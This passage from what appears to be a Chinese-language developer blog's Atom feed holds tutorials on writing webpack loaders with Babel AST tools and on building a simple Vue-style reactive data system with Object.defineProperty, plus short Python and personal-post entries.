class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterable</span><br><span class="line">&gt;&gt;&gt; isinstance(&apos;abc&apos;, Iterable) # str是否可迭代</span><br><span class="line">True</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h1&gt;&lt;h2 id=&quot;输入&quot;&gt;&lt;a href=&quot;#输入&quot; class=&quot;headerlink&quot; title=&quot;输入&quot;&gt;&lt;/a&gt;输入&lt;/h2&gt;&lt;figur
      
    
    </summary>
    
      <category term="python" scheme="http://zhoushaw.github.io/categories/python/"/>
    
    
      <category term="python" scheme="http://zhoushaw.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>loader入门</title>
    <link href="http://zhoushaw.github.io/2019/07/29/learning/font-end/js/loader/"/>
    <id>http://zhoushaw.github.io/2019/07/29/learning/font-end/js/loader/</id>
    <published>2019-07-28T20:17:35.000Z</published>
    <updated>2019-09-05T13:11:36.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。</p><p>可以通过loader对源码进行解析编译，生成新的代码，例如babel-loader，就是对源码进行编译解析将es6转换成es5代码</p><blockquote><p>Loader 基础</p></blockquote><p>由于 Webpack 是运行在 Node.js 之上的，一个 Loader 其实就是一个 Node.js 模块，这个模块需要导出一个函数。 这个导出的函数的工作就是获得处理前的原内容，对原内容执行处理后，返回处理后的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(source) &#123;</span><br><span class="line">  // source 为 compiler 传递给 Loader 的一个文件的原内容</span><br><span class="line">  // 该函数需要返回处理后的内容，这里简单起见，直接把原内容返回了，相当于该 Loader 没有做任何转换</span><br><span class="line">  return source;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="关于学习AST转换的一些文档"><a href="#关于学习AST转换的一些文档" class="headerlink" title="关于学习AST转换的一些文档"></a>关于学习AST转换的一些文档</h2><ul><li><a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/user-handbook.md" target="_blank" rel="noopener">babel-handbook</a></li><li><a href="https://babeljs.io/docs/en/babel-types#functionexpression" target="_blank" rel="noopener">babel-types</a></li><li><a href="https://astexplorer.net/" target="_blank" rel="noopener">ast-explorer</a></li><li><a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/plugin-handbook.md" target="_blank" rel="noopener">Babylon-AST初探-代码生成</a></li></ul><h2 id="Babel-的处理步骤"><a href="#Babel-的处理步骤" class="headerlink" title="Babel 的处理步骤"></a>Babel 的处理步骤</h2><p>Babel 的三个主要处理步骤分别是：</p><ul><li><code>解析（parse）</code></li><li><code>转换（transform）</code></li><li><code>生成（generate）</code></li></ul><blockquote><p>解析</p></blockquote><p>解析步骤接收代码并输出 AST。 这个步骤分为两个阶段：<strong>词法分析（Lexical Analysis） </strong>和 语法分析（Syntactic Analysis）。</p><blockquote><p>转换</p></blockquote><p>转换步骤接收 AST 并对其进行遍历，在此过程中对节点进行添加、更新及移除等操作</p><blockquote><p>生成</p></blockquote><p>代码生成步骤把最终（经过一系列转换之后）的 AST 转换成字符串形式的代码，同时还会创建源码映射（source maps）</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>在进行代码转换前，需要将代码转换成AST语法，可以通过<code>babel</code>提供的<code>parser</code>工具进行转换，具体转换成ast代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 安装依赖 npm install @babel/parser</span><br><span class="line">const parser = require(&quot;@babel/parser&quot;);</span><br><span class="line">// 其中code为提供的源码</span><br><span class="line">let code = `</span><br><span class="line">    function testFn() &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">`;</span><br><span class="line">const ast = parser.parse(code);</span><br></pre></td></tr></table></figure><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><blockquote><p>遍历</p></blockquote><p>要进行代码转换必须对AST进行遍历，它遍历的顺序是按照<strong>树的深度遍历</strong>进行</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190821_1736cgd1g5khfa8a4dfj11k7cebf7_440x376.png" alt=""></p><p>详细遍历过程可参考：<a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/zh-Hans/plugin-handbook.md#%E9%81%8D%E5%8E%86" target="_blank" rel="noopener">traverse遍历规则</a></p><blockquote><p>如何通过babel访问并修改ast节点</p></blockquote><p>我们可以通过<code>@babel/parser</code>npm包对ast进行访问，具体实现代码如下:</p><h2 id="从零开发一个loader"><a href="#从零开发一个loader" class="headerlink" title="从零开发一个loader"></a>从零开发一个loader</h2><p>###利用 loader-runner 调试 Loaders</p><p><a href="https://www.npmjs.com/package/loader-runner" target="_blank" rel="noopener">loader-runner</a> 允许你不依靠 webpack 单独运行 loader</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir loader-example &amp;&amp; cd $_</span><br><span class="line">touch index.js  // 创建需要转换的数据源</span><br><span class="line">npm init</span><br><span class="line">npm install loader-runner --save-dev</span><br></pre></td></tr></table></figure><blockquote><p>创建运行loader文件</p></blockquote><ul><li>step1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch run-loader.js</span><br></pre></td></tr></table></figure><ul><li>step2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//run-loader.js</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">const &#123; runLoaders &#125; = require(&quot;loader-runner&quot;);</span><br><span class="line"></span><br><span class="line">runLoaders(</span><br><span class="line">  &#123;</span><br><span class="line">    resource: &quot;./index.js&quot;, // 转换源</span><br><span class="line">    loaders: [path.resolve(__dirname, &quot;./loader-demo.js&quot;)], // loader地址</span><br><span class="line">    readResource: fs.readFile.bind(fs),</span><br><span class="line">  &#125;,</span><br><span class="line">  // 第二个参数，是一个函数形参是错误、转换结果</span><br><span class="line">  (err, result) =&gt; &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">        console.error(err)</span><br><span class="line">        return;</span><br><span class="line">    &#125; </span><br><span class="line">    //输出转换结果到output.js中</span><br><span class="line">    fs.writeFileSync(&quot;./output.js&quot;, result.result)</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>创建loader</p></blockquote><ul><li>step1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch loader-demo.js</span><br></pre></td></tr></table></figure><ul><li>step2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(source) &#123;</span><br><span class="line">  // ... 对source进行转换</span><br><span class="line">  return source;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="通过AST对代码进行改造"><a href="#通过AST对代码进行改造" class="headerlink" title="通过AST对代码进行改造"></a>通过AST对代码进行改造</h2><p><code>抽象语法树是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构</code></p><blockquote><p>功能</p></blockquote><p>通过 AST 可以实现很多非常有用的功能，例如将 ES6 以后的代码转为 ES5，eslint 的检查，代码美化，甚至 js 引擎都是依赖 AST 实现的，同时因为代码本质只是单纯的字符串，所以并不仅限于 js 之间的转换，scss，less 等 css 预处理器也是通过 AST 转为浏览器认识的 css 代码</p><blockquote><p>起步</p></blockquote><ul><li>step1</li></ul><p><code>npm install @babel/parser @babel/traverse @babel/types @babel/core --save-dev</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。&lt;/p&gt;
&lt;p&gt;可以通过loa
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>戴尔卡耐基-人性的弱点</title>
    <link href="http://zhoushaw.github.io/2019/07/18/other/life/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/"/>
    <id>http://zhoushaw.github.io/2019/07/18/other/life/人性的弱点/</id>
    <published>2019-07-18T03:39:35.000Z</published>
    <updated>2019-08-08T12:02:30.112Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>vue技术内幕-数据响应系统</title>
    <link href="http://zhoushaw.github.io/2019/06/17/learning/font-end/vue/vue-data-reactive/"/>
    <id>http://zhoushaw.github.io/2019/06/17/learning/font-end/vue/vue-data-reactive/</id>
    <published>2019-06-17T13:21:35.000Z</published>
    <updated>2019-06-25T14:27:56.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据响应系统的基本思路"><a href="#数据响应系统的基本思路" class="headerlink" title="数据响应系统的基本思路"></a>数据响应系统的基本思路</h2><p>我们都知道在<code>Vue</code>中存在<code>watch</code>(观察者)。通过设置<code>watch</code>可以对数据进行观察，当数据发生变化时，可以执行对应的观察函数，下面为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var ins = new Vue(&#123;</span><br><span class="line">    data () &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name: &apos;shaw&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">ins.$watch(&apos;name&apos;, ()=&gt;&#123;</span><br><span class="line">    console.log(&apos;name数据发生修改&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，当我们使用<code>ins.name=&#39;zhou shaw&#39;</code>进行修改数据时，控制台会输出<code>name数据发生修改</code>,现在我们将功能抽象出来：</p><blockquote><p>假设我们有一个数据data</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>函数$watch,接收两个参数(要观测的key，回调函数)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$watch(key,()=&gt;&#123;...&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>实现的抽象功能</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br><span class="line">$watch(&apos;name&apos;,()=&gt;&#123;</span><br><span class="line">    console.log(&apos;name 值发生更改&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">data.name = &apos;zhou shaw&apos;;</span><br><span class="line"># log： name 值发生更改</span><br></pre></td></tr></table></figure><p>我们通过<code>$watch</code>函数来添加<code>data</code>对象数据的依赖关系，若<code>data</code>中的数据发生改变时出发对应<code>watch</code>函数。实现这样一个功能说复杂也复杂说简单也简单，说复杂是因为我们需要考虑到很多便捷情况、如重复依赖、深度观测，以及如何处理数组等多种情况。我们暂且不考虑这些边界情况，来实现一个简单的响应式系统。</p><p>首先我们需要面临的第一个问题就是，如何检测数据发生了变化，我们可以通过<code>Object.defineProperty</code>来对属性进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br><span class="line">Object.defineProperty(data,&apos;name&apos;, &#123;</span><br><span class="line">    set (newValue) &#123;</span><br><span class="line">        console.log(&apos;name 值发生更改&apos;);</span><br><span class="line">    &#125;,</span><br><span class="line">    get () &#123;</span><br><span class="line">        console.log(&apos;读取了属性name&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过<code>defineProperty</code>定义我们劫持了data对象的name属性操作，我们可以将劫持的方法封装至<code>watch</code>方法中，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br><span class="line">$watch = function (key, fn) &#123;</span><br><span class="line">    Object.defineProperty(data,&apos;name&apos;, &#123;</span><br><span class="line">        set (newValue) &#123;</span><br><span class="line">            fn();</span><br><span class="line">        &#125;,</span><br><span class="line">        get () &#123;</span><br><span class="line">            console.log(&apos;读取了属性name&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码已经简单实现了对数据的观测，但是大家不难发现其中存在的问题，上面例子中<code>set</code>函数并未设置属性新的赋值，并且<code>get</code>函数并未返回获取的值会导致属性的设置和获取失效。并且上面的例子，我们我无法对一个对象的属性收集多个依赖，并且我们每次调用<code>watch</code>都对属性重新定义了<code>set</code>和<code>get</code>,当属性还存在其他依赖时这样会覆盖原有的依赖，我们不妨展开🤔，<code>set</code>函数可以用于触发数据数据发生变化，我们可不可以通过<code>get</code>函数来进行依赖收集呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    age: 23</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let Target;</span><br><span class="line"></span><br><span class="line">let dep = [];</span><br><span class="line"></span><br><span class="line">let val = data[&apos;name&apos;];</span><br><span class="line">Object.defineProperty(data, &apos;name&apos;, &#123;</span><br><span class="line">    set(newValue) &#123;</span><br><span class="line">        // 设置新值与旧值相等，不进行依赖</span><br><span class="line">        if (val === newValue) return;</span><br><span class="line">        val = newValue</span><br><span class="line">        // 执行依赖</span><br><span class="line">        dep.forEach(fn =&gt; fn());</span><br><span class="line">    &#125;,</span><br><span class="line">    get() &#123;</span><br><span class="line">        // 有依赖进行收集</span><br><span class="line">        if (Target) dep.push(Target);</span><br><span class="line">        return val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$watch = function (key,fn) &#123;</span><br><span class="line">    Target = fn;</span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$watch(&apos;name&apos;, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;设置了name&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$watch(&apos;name&apos;, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;多重依赖，啦啦啦&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data.name = &apos;zhou shaw&apos;;</span><br></pre></td></tr></table></figure><p>上述代码并未对其<code>data</code>属性进行数据响应，我们可以通过遍历添加依赖关系。并且我们会发现若我们通过访问数据便收集了依赖，那么会触发大量的重复依赖收集后面我们会讲解如何解决：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    age: 23</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let Target; // 用于缓存依赖函数</span><br><span class="line"></span><br><span class="line">for (let key in data) &#123;</span><br><span class="line">    let dep = [];</span><br><span class="line">    let val = data[key];</span><br><span class="line">    Object.defineProperty(data, key, &#123;</span><br><span class="line">        set(newValue) &#123;</span><br><span class="line">            if (val === newValue) return; // 设置新值与旧值相等，不进行依赖</span><br><span class="line">            val = newValue</span><br><span class="line">            dep.forEach(fn =&gt; fn()); // 执行依赖</span><br><span class="line">        &#125;,</span><br><span class="line">        get() &#123;</span><br><span class="line">            if (Target) dep.push(Target); // 有依赖进行收集</span><br><span class="line">            return val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let $watch = function (key,fn) &#123;</span><br><span class="line">    Target = fn;</span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但如果数据结构是这样呢：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    infos: &#123;</span><br><span class="line">        phone: &apos;17xxx&apos;,</span><br><span class="line">        wechat: &apos;xxx&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们会发现我们并没有对深层次对象监听，如果数据结构更为复杂呢，我们可以将数据拦截方法封装成一个函数，对数据对象进行递归遍历，将所有属性都添加依赖，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">let Target; // 用于缓存依赖函数</span><br><span class="line"></span><br><span class="line">function walk(data) &#123;</span><br><span class="line">    for (let key in data) &#123;</span><br><span class="line">        let dep = [];</span><br><span class="line">        let val = data[key];</span><br><span class="line">        // 当数据为对象类型时递归遍历</span><br><span class="line">        if (Object.prototype.toString.call(val) === &apos;[object Object]&apos;) &#123; </span><br><span class="line">            walk(val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object.defineProperty(data, key, &#123;</span><br><span class="line">            set(newValue) &#123;</span><br><span class="line">                if (val === newValue) return; // 设置新值与旧值相等，不进行依赖</span><br><span class="line">                val = newValue</span><br><span class="line">                dep.forEach(fn =&gt; fn()); // 执行依赖</span><br><span class="line">            &#125;,</span><br><span class="line">            get() &#123;</span><br><span class="line">                if (Target) dep.push(Target); // 有依赖进行收集</span><br><span class="line">                return val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">walk(data);</span><br><span class="line"></span><br><span class="line">let $watch = function (key,fn) &#123;</span><br><span class="line">    Target = fn;</span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管对数据进行深度观察了，但我们会发现，我们的<code>watch</code>函数并不会对<code>infos.wechat</code>进行观察，所以我们需要对<code>$watch</code>函数进行改造，让其支持<code>infos.wechat</code>依赖收集，所以我们想实现的效果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$watch(&apos;infos.wechat&apos;, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;修改了wechat&apos;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>由于我们已经实现了数据进行访问即可收集依赖，但我们无法直接通过<code>infos.wechat</code>收集，我们需要将其转换成<code>data[&#39;infos&#39;][&#39;wechat&#39;]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    infos: &#123;</span><br><span class="line">        wechat: &apos;466&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let $watch = function (key,fn) &#123;</span><br><span class="line"></span><br><span class="line">    Target = fn;</span><br><span class="line"></span><br><span class="line">    if (/\./.test(key)) &#123;</span><br><span class="line">        let paths = key.split(&apos;.&apos;);</span><br><span class="line">        let obj = data;</span><br><span class="line">        paths.forEach((path) =&gt; &#123;</span><br><span class="line">            obj = obj[path];</span><br><span class="line">        &#125;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里为止我们已经实现了一个简单的数据依赖收集系统，我们如何实现dom节点和数据绑定式渲染呢，在vue中模板最终都会生成一个render函数，通过这个函数来实现最终的渲染。若<code>render</code>函数中访问了<code>data</code>数据，我们可以观察<code>render</code>函数中的data数据，若<code>render</code>函数中访问的数据发生变化，则执行<code>render</code>函数进行重新渲染，那么如何收集<code>render</code>函数中访问的依赖，并将<code>render</code>函数与数据建立联系呢，很简单我们将<code>watch</code>函数进行改造一下就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">let $watch = function (exp,fn) &#123;</span><br><span class="line"></span><br><span class="line">    Target = fn;</span><br><span class="line">    if (typeof exp===&quot;function&quot;) &#123;</span><br><span class="line">        exp();</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (/\./.test(exp)) &#123;</span><br><span class="line">        let paths = exp.split(&apos;.&apos;);</span><br><span class="line">        let obj = data;</span><br><span class="line">        paths.forEach((path) =&gt; &#123;</span><br><span class="line">            obj = obj[path];</span><br><span class="line">        &#125;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[exp];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function render() &#123;</span><br><span class="line">    return document.write(`姓名：$&#123;data.name&#125;; 年龄：$&#123;data.age&#125;&lt;br/&gt;`)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$watch(render, render)</span><br></pre></td></tr></table></figure><p>在这里我们将<code>$watch</code>函数进行了改造，我们将第一个参数的表达是进行了类型判断，如果是函数类型进行执行。因为我们是通过<code>get</code>拦截进行依赖收集的，执行函数后可以收集<code>render</code>函数中数据的依赖，依赖的执行函数就是<code>render</code>，若我们对<code>render</code>函数中依赖的data数据进行修改，就会触发<code>render</code>函数从而实现数据响应视图。当然这里的实现只是vue的基本原理，从这里我们不难看出我们实现的这个简陋的响应系统中存在的问题，当修改数据触发<code>render</code>函数时，又进行了重复的依赖收集，并且这里也没有针对<code>Object.defineProperty</code>属性无法对数组进行观察进行处理。接下来会针对这一系列问题进行处理</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;数据响应系统的基本思路&quot;&gt;&lt;a href=&quot;#数据响应系统的基本思路&quot; class=&quot;headerlink&quot; title=&quot;数据响应系统的基本思路&quot;&gt;&lt;/a&gt;数据响应系统的基本思路&lt;/h2&gt;&lt;p&gt;我们都知道在&lt;code&gt;Vue&lt;/code&gt;中存在&lt;code&gt;wat
      
    
    </summary>
    
      <category term="vue" scheme="http://zhoushaw.github.io/categories/vue/"/>
    
    
      <category term="vue" scheme="http://zhoushaw.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>《黑镜》圣诞特别篇：人间地狱</title>
    <link href="http://zhoushaw.github.io/2019/06/14/other/life/%E9%BB%91%E9%95%9C-%E5%9C%A3%E8%AF%9E%E7%89%B9%E5%88%AB%E7%AF%87/"/>
    <id>http://zhoushaw.github.io/2019/06/14/other/life/黑镜-圣诞特别篇/</id>
    <published>2019-06-14T03:39:35.000Z</published>
    <updated>2019-06-15T15:57:16.697Z</updated>
    
